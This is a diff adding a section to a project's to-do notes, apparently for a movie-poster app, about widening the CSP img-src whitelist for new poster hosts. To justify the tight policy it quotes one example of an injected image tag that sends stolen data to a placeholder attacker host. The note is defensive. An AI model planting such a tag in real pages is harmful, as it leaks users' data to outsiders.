@@ -53,6 +53,9 @@ A few places (e.g., `usePreferences.ts` upsert) just `console.error` on failure.
 ### 7. Add tests for `utils/csv.ts`
 The CSV utility is a perfect first test target — pure functions, clear inputs/outputs. Whenever you regress a CSV import this is the obvious thing to set up.
 
+### 8. Expand the CSP `img-src` whitelist when adding new poster sources
+`index.html` line 7 currently allows poster images from `'self'`, `https://image.tmdb.org`, and inline `data:` URIs only. This is intentionally tight to prevent data exfiltration via injected `<img src="https://evil.com/log?stolen=...">`. When you let users add posters from other hosts (IMDB, personal photo URLs, etc.), add those hosts to `img-src`. Any image not on the whitelist will silently fail to load.
+
 ---
 
 ## 🌱 New feature ideas (longer-term)
